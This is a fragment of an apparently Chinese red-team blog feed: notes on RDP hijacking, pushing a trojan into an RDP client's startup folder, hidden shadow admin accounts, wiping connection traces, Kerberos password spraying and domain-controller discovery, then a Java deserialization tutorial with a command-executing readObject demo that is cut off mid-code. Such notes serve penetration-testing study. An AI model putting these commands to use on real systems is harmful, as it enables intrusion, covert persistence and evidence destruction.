class="line">token::elevate</span><br><span class="line">ts::remote &#x2F;id:1</span><br></pre></td></tr></table></figure><p>RDP劫持经常应用到如下场景：</p><blockquote><p>（1）需要获取目标界面信息，如：mssql客户端连接数据库</p><p>（2）切换域用户身份，域内提权。如：域管账号登录在当前机器，抓密码的方式均被拦截可以考虑该方式</p><p>（3）绕过安全防护。如：之前遇到的一个奇葩环境，System权限使用prodump被AV拦截，但是切换到管理员权限可以正常dump……</p></blockquote><h2 id="RDP-服务器反打客户端"><a href="#RDP-服务器反打客户端" class="headerlink" title="RDP 服务器反打客户端"></a>RDP 服务器反打客户端</h2><blockquote><p> 需要客户端RDP链接时，开启磁盘共享（将本地磁盘挂在到服务器上）才能正常利用</p></blockquote><p>手动利用过程：假设客户端和登录服务器的用户都是Administrator</p><p>​    （1）在服务器端设置Administrator 启动项目，<code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\powershell.vbs</code> 作用是无弹窗执行bat脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set ws&#x3D;WScript.CreateObject(&quot;WScript.Shell&quot;)ws.Run &quot;C:\Windows.bat&quot;,0ws.Run &quot;cmd &#x2F;c del C:\Windows\Temp\service.exe&quot;,0</span><br></pre></td></tr></table></figure><p>​    （2）Windows.bat 脚本内容实现马（service.exe）拷贝到客户端的<strong>启动目录</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy &quot;C:\Windows\Temp\service.exe&quot; &quot;\\tsclient\c\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup\service.exe&quot;</span><br></pre></td></tr></table></figure><p>也可以根据实际情况，将Rat拷贝到客户端的其他目录，将激活脚本拷贝到客户端启动目录；</p><p>如果不出网的情况下，也可以将exe替换成要执行的脚本 。</p><p>利用工具：<a href="https://github.com/mdsecactivebreach/RDPInception">https://github.com/mdsecactivebreach/RDPInception</a></p><ol><li>Modify batch file to execute PowerShell stager, EXE or even DLL.</li><li>Upload to the target, execute.</li></ol><h2 id="开启RDP影子用户"><a href="#开启RDP影子用户" class="headerlink" title="开启RDP影子用户"></a>开启RDP影子用户</h2><p>在Windows中，添加账户名后面加入<code>$</code>符合可以使该用户在命令行中隐藏</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622213958809.png)</p><p>net user 是看不到的，但是确实存在。</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622214055156.png)</p><p>将影子用户添加到管理员组：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators nb666$ /add</span><br></pre></td></tr></table></figure><p>这点隐藏完全不够，Windows用户的登录界面，会显示所有可以登录的用户。</p><h3 id="影子用户隐藏登录界面"><a href="#影子用户隐藏登录界面" class="headerlink" title="影子用户隐藏登录界面"></a>影子用户隐藏登录界面</h3><p>方法：更改注册表，克隆账号。</p><p>启动cmd，然后输入<code>regedit</code>，打开注册表。</p><p>找到 <code>HEKY_LOCAL_MACHINE\SAM\SAM\Domains\Account\User</code>，而默认情况下<code>SAM</code>键值只能由<strong>system</strong>权限进行修改</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622215055478.png)</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622215118852.png)</p><p>导出注册表，并修改F值</p><p><img src="https://hackergu.com/wp-content/uploads/2020/03/618b2d75da1ba69.png"></p><p><img src="https://hackergu.com/wp-content/uploads/2020/03/b870c2bf89419b0.png" alt="img"></p><p>然后替换F值，删除之前创建的影子用户即可。</p><p>具体操作看谷师傅的博客：<a href="https://hackergu.com/power-shadowuser/">https://hackergu.com/power-shadowuser/</a></p><p>用户克隆的注意事项：</p><blockquote><p>我们以<code>test$</code>身份登录，但是登陆之后的身份却是<code>WIN7</code>用户，桌面也是<code>WIN7</code>用户的，达到克隆效果。所以，在实际操作时，要小心在桌面的操作，以防被发现。</p><p>进行操作的时候，不要使用域用户进行操作，该操作只适用于本地用户。利用的局限性比较大，只有在登录远程桌面并且权限较大时才可以精确利用。</p></blockquote><h2 id="RDP-连接痕迹清除"><a href="#RDP-连接痕迹清除" class="headerlink" title="RDP 连接痕迹清除"></a>RDP 连接痕迹清除</h2><blockquote><p>利用”跳板”主机连接许多内网IP地址的3389 在渗透结束时清除”脚印” 3389连接记录也是必清除项目之一</p></blockquote><p>运行regedit</p><p>找到<code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default</code> 设置为不可改写，即不会留记录。</p><p>如下，</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622221409318.png)</p><p>这里也可以导出RDP的连接记录。</p><p>通过以下命令枚举指定注册表项下所有的的子项，即当前用户所连接过的所有的主机名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir &quot;Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; -Name</span><br></pre></td></tr></table></figure><p>然后使用以下命令查询指定注册表项的注册表键值，即查看连接所使用的用户名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Get-ItemProperty -Path &quot;Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\1.xxx.xxx.xxx&quot;).UsernameHint</span><br></pre></td></tr></table></figure><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622222847702.png)</p><p>并且在运行mstsc.exe ，连接框中也会有连接过的ip/域名。</p><p>这个信息储存在“我的文档”下的“Default.rdp”文件中，删掉就可以了。</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622221553138.png)</p><h2 id="CVE-2019-0708-BlueKeep"><a href="#CVE-2019-0708-BlueKeep" class="headerlink" title="CVE-2019-0708(BlueKeep)"></a>CVE-2019-0708(BlueKeep)</h2><p>2019 年 5 月 14 日微软官方发布安全补丁，修复了 Windows 远程桌面服务的远程代码执行漏洞（CVE-2019-0708），该高危漏洞利用方式是通过远程桌面端口 3389，RDP 协议进行攻击的。</p><p>此漏洞是预身份验证且无需用户交互，这就意味着这个漏洞可以通过网络蠕虫的方式被利用。利用此漏洞的任何恶意软件都可能从被感染的计算机传播到其他易受攻击的计算机，其方式与 2017 年 WannaCry 恶意软件的传播方式类似。</p><p>它影响了某些旧版本的 Windows 系统，包括：</p><blockquote><p>Windows 7 foR 32-bit Systems Service Pack 1</p><p>Windows 7 for x64-based Systems Service Pack 1</p><p>Windows Server 2008 foR 32-bit Systems Service Pack 2</p><p>Windows Server 2008 foR 32-bit Systems Service Pack 2 (Server Core installation)</p><p>Windows Server 2008 for Itanium-Based Systems Service Pack 2</p><p>Windows Server 2008 for x64-based Systems Service Pack 2</p><p>Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)</p><p>Windows Server 2008 R2 for Itanium-Based Systems Service Pack 1</p><p>Windows Server 2008 R2 for x64-based Systems Service Pack 1</p><p>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</p><p>Windows XP SP3 x86</p><p>Windows XP Professional x64 Edition SP2</p><p>Windows XP Embedded SP3 x86</p><p>Windows Server 2003 SP2 x86</p><p>Windows Server 2003 x64 Edition SP2</p></blockquote><p>Windows 8 和 Windows 10 及之后版本的用户不受此漏洞的影响。</p><p><strong>实战还没成功过</strong>。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.jb51.net/article/93496.htm">https://www.jb51.net/article/93496.htm</a></p><p><a href="https://blog.csdn.net/seaskying/article/details/9361181">https://blog.csdn.net/seaskying/article/details/9361181</a></p><p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9A%84%E5%A4%9A%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95">https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9A%84%E5%A4%9A%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95</a></p><p><a href="https://pythonpig.github.io/2016/12/21/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9F%A5%E8%AF%86%E6%B1%87%E6%80%BB/">https://pythonpig.github.io/2016/12/21/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9F%A5%E8%AF%86%E6%B1%87%E6%80%BB/</a></p><p><a href="https://docs.microsoft.com/zh-cn/windows-server/remote/remote-desktop-services/clients/remote-desktop-supported-config">https://docs.microsoft.com/zh-cn/windows-server/remote/remote-desktop-services/clients/remote-desktop-supported-config</a></p><p><a href="http://t3ngyu.leanote.com/post/LM-RDP">http://t3ngyu.leanote.com/post/LM-RDP</a></p><p><a href="https://www.cnblogs.com/mujj/articles/3065895.html">https://www.cnblogs.com/mujj/articles/3065895.html</a></p><p><a href="https://www.tomshardware.com/reviews/enable-remote-desktop-in-windows-server-2016,5592.html">https://www.tomshardware.com/reviews/enable-remote-desktop-in-windows-server-2016,5592.html</a></p><p><a href="https://blog.yowko.com/windows-server-2016-enable-remote-desktop/#%E4%BD%BF%E7%94%A8-powershell">https://blog.yowko.com/windows-server-2016-enable-remote-desktop/#%E4%BD%BF%E7%94%A8-powershell</a></p><p><a href="https://www.rootusers.com/how-to-enable-remote-desktop-in-windows-server-2019/">https://www.rootusers.com/how-to-enable-remote-desktop-in-windows-server-2019/</a></p><p><a href="https://www.k0rz3n.com/2018/06/26/windows%E6%B8%97%E9%80%8F%E4%B8%AD%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%96%B9%E6%B3%95%E6%8E%A2%E7%A9%B6/">https://www.k0rz3n.com/2018/06/26/windows%E6%B8%97%E9%80%8F%E4%B8%AD%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%96%B9%E6%B3%95%E6%8E%A2%E7%A9%B6/</a></p><p><a href="https://hackergu.com/power-shadowuser/">https://hackergu.com/power-shadowuser/</a></p><p><a href="http://www.91ri.org/2234.html">http://www.91ri.org/2234.html</a></p><h1 id="域外寻找域控思路"><a href="#域外寻找域控思路" class="headerlink" title="域外寻找域控思路"></a>域外寻找域控思路</h1><p>主要是端口扫描。</p><h2 id="扫描内网中同时开放389和53端口的机器、88和389端口"><a href="#扫描内网中同时开放389和53端口的机器、88和389端口" class="headerlink" title="扫描内网中同时开放389和53端口的机器、88和389端口"></a>扫描内网中同时开放389和53端口的机器、88和389端口</h2><p>端口：389<br>服务：LDAP、ILS<br>说明：轻型目录访问协议和NetMeeting Internet Locator Server共用这一端口。</p><p>端口：53<br>服务：Domain Name Server（DNS）<br>说明：53端口为DNS(Domain Name Server，域名服务器)服务器所开放，主要用于域名解析，DNS服务在NT系统中使用的最为广泛。通过DNS服务器可以实现域名与IP地址之间的转换，只要记住域名就可以快速访问网站。</p><p>端口：88</p><p>服务：88/UDP（用户数据报协议）– Kerberos</p><p>Kerberos 协议是一种基于密钥分发模型的网络身份验证方法。该协议使在网络上进行通信的实体能够证明彼此的身份，同时该协议可以阻止窃听或重放攻击。 Kerberos 密钥分发中心 (KDC) 在该端口上侦听票证请求。Kerberos 协议的 88 端口也可以是 TCP/UDP。</p><p>外网使用该功能需要将服务端机器的查帐端口2531映射到外网。</p><h1 id="域外如何打域控"><a href="#域外如何打域控" class="headerlink" title="域外如何打域控"></a>域外如何打域控</h1><h2 id="不知道是什么方法的方法"><a href="#不知道是什么方法的方法" class="headerlink" title="不知道是什么方法的方法"></a>不知道是什么方法的方法</h2><p><a href="https://cloud.tencent.com/developer/news/140493">https://cloud.tencent.com/developer/news/140493</a></p><p>Responder 抓到一台域内机器的Net-NTLM v2 Hash ，CME 检查NetBIOS，确定是否和用户对应，hashcat 破解Net-NTLM v2 Hash，获取到 SAM 文件存储的NTLM Hash，pth &amp; psexec。</p><p><a href="https://github.com/SpiderLabs/Responder">https://github.com/SpiderLabs/Responder</a></p><p><a href="https://github.com/byt3bl33d3r/CrackMapExec/releases">https://github.com/byt3bl33d3r/CrackMapExec/releases</a></p><h2 id="ZeroLogon"><a href="#ZeroLogon" class="headerlink" title="ZeroLogon"></a>ZeroLogon</h2><p>有空复现下，利用链和复现文章网上都有。</p><h2 id="账号密码暴破"><a href="#账号密码暴破" class="headerlink" title="账号密码暴破"></a>账号密码暴破</h2><p>在内网中，尽量能搜集就先搜集，爆破枚举不到万不得已的情况，不要使用。（流量设备、防火墙）</p><ul><li>Kerberos 域用户暴破</li></ul><p>kerbrute，该工具可在非域主机上使用，保持主机与域控机器通信正常即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;kerbrute_darwin_amd64 -domain DOMAIN_NAME -users user.txt -password P@ssword01! -dc-ip 192.168.1.2</span><br></pre></td></tr></table></figure><ul><li>DomainPasswordSpray</li></ul><h1 id="域内寻找域控思路"><a href="#域内寻找域控思路" class="headerlink" title="域内寻找域控思路"></a>域内寻找域控思路</h1><h2 id="常见的命令"><a href="#常见的命令" class="headerlink" title="常见的命令"></a>常见的命令</h2><ul><li>net group</li></ul><p>net group “domain controllers” /domain</p><ul><li>nltest</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest &#x2F;dclist:DOMAIN_NAME</span><br></pre></td></tr></table></figure><ul><li>net time /domain</li></ul><h2 id="查询dns解析记录"><a href="#查询dns解析记录" class="headerlink" title="查询dns解析记录"></a>查询dns解析记录</h2><p>若当前主机的dns为域内dns，可通过查询dns解析记录定位域控。</p><p>DOMAIN_NAME 为 已知的域名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -type&#x3D;all _ldap._tcp.dc._msdcs.DOMAIN_NAME</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslookup</span><br><span class="line">set type&#x3D;all</span><br><span class="line">ldap.tcp.dc._msdcs.DOMAIN_NAME</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslookup</span><br><span class="line">set type&#x3D;all</span><br><span class="line">_msdcs.DOMAIN_NAME</span><br></pre></td></tr></table></figure><p>原理：域控服务器会向DNS服务器注册DNS记录，以便当客户端需要加入域或者和域有其他交互的时候，可以找到它。</p><p><strong>值得注意的是，使用nslookup的时候，DNS服务器必须是内部DNS，否者是查询不到记录的，因为域控服务器只会向内部DNS服务器注册这个记录。</strong></p><blockquote><p>大多情况下，内部DNS服务器和AD域控服务器默认部署在同一台服务器。如果是这种情况，找到DNS服务器就能找到了域控服务器。</p></blockquote><h2 id="SPN-扫描"><a href="#SPN-扫描" class="headerlink" title="SPN 扫描"></a>SPN 扫描</h2><p>大部分win系统默认已自带spn探测工具即：<code>setspn.exe</code></p><p>此操作无需管理权限</p><p>域内机器执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T target.com -Q *&#x2F;*</span><br></pre></td></tr></table></figure><h2 id="AdFind-exe"><a href="#AdFind-exe" class="headerlink" title="AdFind.exe"></a>AdFind.exe</h2><p>列出域控制器名称：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc dclist</span><br></pre></td></tr></table></figure><p>查询当前域中在线的计算机：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc computers_active</span><br></pre></td></tr></table></figure><p>查询当前域中在线的计算机(只显示名称和操作系统)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc computers_active name operatingSystem</span><br></pre></td></tr></table></figure><p>查询当前域中所有计算机：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -f &quot;objectcategory&#x3D;computer&quot;</span><br></pre></td></tr></table></figure><p>查询当前域中所有计算机(只显示名称和操作系统)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -f &quot;objectcategory&#x3D;computer&quot; name operatingSystem</span><br></pre></td></tr></table></figure><p>查询域内所有用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -users name</span><br></pre></td></tr></table></figure><p>查询所有GPO：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc gpodmp</span><br></pre></td></tr></table></figure><p>ADSearch 也可以。</p><p><a href="https://github.com/tomcarver16/ADSearch">https://github.com/tomcarver16/ADSearch</a></p><h2 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/Notes/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.md">https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/Notes/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.md</a></p><p><a href="http://www.code2sec.com/zai-nei-wang-huan-jing-zhong-ding-wei-adyu-kong-fu-wu-qi.html">http://www.code2sec.com/zai-nei-wang-huan-jing-zhong-ding-wei-adyu-kong-fu-wu-qi.html</a></p><p><a href="https://cloud.tencent.com/developer/news/140493">https://cloud.tencent.com/developer/news/140493</a></p><p><a href="https://hackergu.com/kerberos-sec-list-brute-user/">https://hackergu.com/kerberos-sec-list-brute-user/</a></p><p>88/TCP    Kerberos - 认证代理</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210624111457.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;欢迎关注公众号，以后博客不更新了，文章都在公众号发。&lt;/p&gt;</summary>
      
    
    
    
    
    <category term="红蓝对抗" scheme="https://hack-for.fun/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化之URLDNS利用链分析学习笔记</title>
    <link href="https://hack-for.fun/65bb.html"/>
    <id>https://hack-for.fun/65bb.html</id>
    <published>2021-04-05T07:58:38.000Z</published>
    <updated>2021-05-25T10:11:31.848Z</updated>
    
    <content type="html"><![CDATA[<p>首发于阿里云先知社区，<a href="https://xz.aliyun.com/t/9417">https://xz.aliyun.com/t/9417</a></p><a id="more"></a><h1 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h1><p>我们都知道一个对象只要实现了Serilizable接口，这个对象就可以被序列化，java的这种序列化模式为开发者提供了很多便利，我们可以不必关系具体序列化的过程，只要这个类实现了Serilizable接口，这个类的所有属性和方法都会自动序列化。</p><p>Java 序列化是指把 Java 对象转换为字节序列的过程</p><ul><li>ObjectOutputStream类的 writeObject() 方法可以实现序列化</li></ul><p>Java 反序列化是指把字节序列恢复为 Java 对象的过程</p><ul><li>ObjectInputStream 类的 readObject() 方法用于反序列化。</li></ul><p>实现java.io.Serializable接口才可被反序列化，而且所有属性必须是可序列化的<br>(用<code>transient</code> 关键字修饰的属性除外，不参与序列化过程)</p><p>User.java(需要序列化的类)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Serialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Main.java(序列化和反序列化)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Serialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        User user=<span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">&quot;LearnJava&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] serializeData=serialize(user);</span><br><span class="line">        FileOutputStream fout = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;user.bin&quot;</span>);</span><br><span class="line">        fout.write(serializeData);</span><br><span class="line">        fout.close();</span><br><span class="line">        User user2=(User) unserialize(serializeData);</span><br><span class="line">        System.out.println(user2.getName());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream btout = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(btout);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ByteArrayInputStream btin = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">        ObjectInputStream objIn = <span class="keyword">new</span> ObjectInputStream(btin);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看user.bin文件，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00000000: aced 0005 7372 0012 5365 7269 616c 697a  ....sr..Serializ</span><br><span class="line">00000010: 6174 696f 6e2e 5573 6572 ade4 cb02 ab94  ation.User......</span><br><span class="line">00000020: b2b9 0200 014c 0004 6e61 6d65 7400 124c  .....L..namet..L</span><br><span class="line">00000030: 6a61 7661 2f6c 616e 672f 5374 7269 6e67  java&#x2F;lang&#x2F;String</span><br><span class="line">00000040: 3b78 7074 0009 4c65 6172 6e4a 6176 61    ;xpt..LearnJava</span><br></pre></td></tr></table></figure><blockquote><p>根据序列化规范，aced代表java序列化数据的magic wordSTREAM_MAGIC,0005表示版本号STREAM_VERSION,73表示是一个对象TC_OBJECT,72表示这个对象的描述TC_CLASSDESC</p></blockquote><h2 id="readObject-方法"><a href="#readObject-方法" class="headerlink" title="readObject()方法"></a>readObject()方法</h2><blockquote><p>从JAVA反序列化RCE的三要素（readobject反序列化利用点 + 利用链 + RCE触发点）来说，是通过（readobject反序列化利用点 + DNS查询）来确认readobject反序列化利用点的存在。</p></blockquote><p>实现了java.io.Serializable接口的类还可以定义如下方法(反序列化魔术方法)将会在类序列化和反序列化过程中调用：</p><ul><li>private void writeObject(ObjectOutputStream oos),自定义序列化</li><li>private void readObject(ObjectInputStream ois),自定义反序列化</li></ul><p>readObject()方法被重写的的话，反序列化该类时调用便是重写后的readObject()方法。如果该方法书写不当的话就有可能引发恶意代码的执行：</p><p>Evil.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> EvilSerializtion;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String cmd;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream stream)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        stream.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Main.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> EvilSerializtion;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Evil evil = <span class="keyword">new</span> Evil();</span><br><span class="line">        evil.cmd = <span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] serializeData = serialize(evil);</span><br><span class="line">        unserialize(serializeData);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream btout = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(btout);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">    &#125;</span><br><span 